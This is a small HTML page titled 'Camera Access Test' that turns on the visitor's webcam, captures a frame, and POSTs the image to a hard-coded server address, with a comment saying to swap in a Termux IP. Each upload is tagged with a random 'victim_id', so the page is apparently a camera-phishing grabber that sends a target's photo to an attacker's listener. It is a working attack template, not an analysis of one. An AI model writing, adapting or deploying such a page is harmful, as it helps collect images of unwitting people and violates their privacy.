<!DOCTYPE html>
<html>
<body>
    <h2>Camera Access Test</h2>
    <video id="video" width="400" autoplay></video><br>
    <button onclick="start()">Start Camera</button>
    <button onclick="capture()">Capture & Send</button>
    <script>
        const video = document.getElementById('video');
        let stream;
        const SERVER_URL = 'http://10.162.134.158:8080/upload'; // GANTI dengan IP Termux
        
        function start() {
            navigator.mediaDevices.getUserMedia({video: true})
                .then(s => { stream = s; video.srcObject = s; });
        }
        
        function capture() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const image = canvas.toDataURL('image/jpeg');
            
            fetch(SERVER_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim_id: 'user_' + Math.random().toString(36).substr(2, 9),
                    image: image
                })
            }).then(r => alert('Sent!'));
        }
    </script>
</body>
</html>
